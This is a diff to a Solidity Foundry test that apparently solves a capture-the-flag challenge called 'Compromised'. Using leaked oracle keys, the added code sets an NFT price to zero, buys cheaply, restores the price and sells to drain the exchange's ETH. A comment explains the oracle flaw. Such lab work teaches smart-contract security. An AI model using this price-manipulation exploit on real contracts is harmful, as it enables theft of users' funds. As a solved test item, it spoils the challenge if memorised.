@@ -75,7 +75,37 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        ////NOTE (tina):set price to 0 buy low sell high
+        // private keys leaked of 2 oracles decoded from the random number in README.md
+        address source1 = sources[0]; // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        address source2 = sources[1]; // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
         
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+        
+        uint256 nftId = exchange.buyOne{value: 1 wei}();
+      
+        nft.approve(address(exchange), nftId);
+        vm.stopPrank();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+        
+        exchange.sellOne(nftId);
+        
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+
+        //this is why the exploit works: TrustfulOracle contract allow anyone who have TRUSTED_SOURCE_ROLE to call postPrice()
     }
 
     /**
